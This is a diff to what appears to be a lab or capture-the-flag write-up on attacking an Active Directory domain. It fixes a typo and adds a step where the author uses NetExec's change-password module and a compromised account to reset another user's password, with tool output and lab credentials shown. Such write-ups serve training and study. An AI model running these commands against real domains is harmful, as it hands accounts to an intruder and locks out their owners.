@@ -1243,4 +1243,15 @@ SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019
 SMB         10.0.18.23      445    DC               [+] novacart.local\cliff.b:safEpAss69 
 CHANGE-P... 10.0.18.23      445    DC               [+] Successfully changed password for cliff.b
 ```
-So stupidly, i accidently forgot to specifiy the target user for the password change so this has changed `c`
+So stupidly, i accidentally forgot to specify the target user for the password change so this has changed `cliff.b` password
+
+But i can still change `m.mignola` password, ill just have to use the updated password of cliff.b
+
+```python
+nxc smb dc.novacart.local -u cliff.b -p 'Password123!' -M change-password -o USER=m.mignola NEWPASS='Password123!'
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [+] novacart.local\cliff.b:Password123! 
+CHANGE-P... 10.0.18.23      445    DC               [+] Successfully changed password for m.mignola
+```
+Now the users password has been changed!
+
